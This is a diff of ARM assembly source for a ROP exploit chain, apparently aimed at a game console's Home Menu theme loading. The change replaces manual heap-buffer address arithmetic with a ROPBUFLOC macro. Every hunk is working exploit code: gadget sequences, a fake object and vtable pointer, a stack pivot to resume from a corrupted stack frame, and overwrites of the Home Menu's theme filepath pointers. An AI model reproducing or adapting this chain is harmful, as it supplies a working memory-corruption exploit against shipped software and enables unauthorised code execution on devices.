@@ -17,7 +17,7 @@ ROPMACRO_COPYWORD TARGETOVERWRITE_STACKADR, (ORIGINALOBJPTR_BASELOADADR+8)
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
-.word (HEAPBUF + (rop_ret2menu_stack_lrval - _start)) @ r0
+.word ROPBUFLOC(rop_ret2menu_stack_lrval) @ r0
 
 .word POP_R1PC
 .word TARGETOVERWRITE_STACKADR+0x20 @ r1
@@ -51,7 +51,7 @@ rop_ret2menu_stack_lrval:
 .word ROP_ADDR0_TO_R1 @ r0 = rop_ret2menu_stack_lrval + <above r1 value>
 
 .word POP_R1PC
-.word (HEAPBUF + (rop_ret2menu_stack_newlrval - _start))
+.word ROPBUFLOC(rop_ret2menu_stack_newlrval)
 
 .word ROP_STR_R0TOR1 @ Write the above r0 value to rop_ret2menu_stack_newlrval.
 
@@ -85,7 +85,7 @@ ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80 + (0x28+0xc)), 0x0
 ROPMACRO_WRITEWORD TARGETOVERWRITE_STACKADR+0x8, 0x0
 
 @ Copy the theme filepath strings to THEMEDATA_NEWFILEPATHS_BASEADDR.
-CALLFUNC_NOSP MEMCPY, THEMEDATA_NEWFILEPATHS_BASEADDR, (HEAPBUF + ((filepath_theme_stringblkstart) - _start)), (filepath_theme_stringblkend - filepath_theme_stringblkstart), 0
+CALLFUNC_NOSP MEMCPY, THEMEDATA_NEWFILEPATHS_BASEADDR, ROPBUFLOC(filepath_theme_stringblkstart), (filepath_theme_stringblkend - filepath_theme_stringblkstart), 0
 
 @ Overwrite the string ptrs in Home Menu .data which are used for the theme extdata filepaths. Don't touch the BGM paths, since those don't get used for reading during theme-load anyway.
 #ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
@@ -120,16 +120,16 @@ ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYCACHE, (THEMEDATA_NEWFILEPATHS_
 ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4FPPC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
 
 object:
-.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
-.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
+.word ROPBUFLOC(vtable) @ object+0, vtable ptr
+.word ROPBUFLOC(object) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
 .word 0 @ Memchunk-hdr stuff writes here.
 .word 0
 
-.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
 
 .space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
 stackpivot_sploadword:
-.word HEAPBUF + (ropstackstart - _start) @ sp
+.word ROPBUFLOC(ropstackstart) @ sp
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
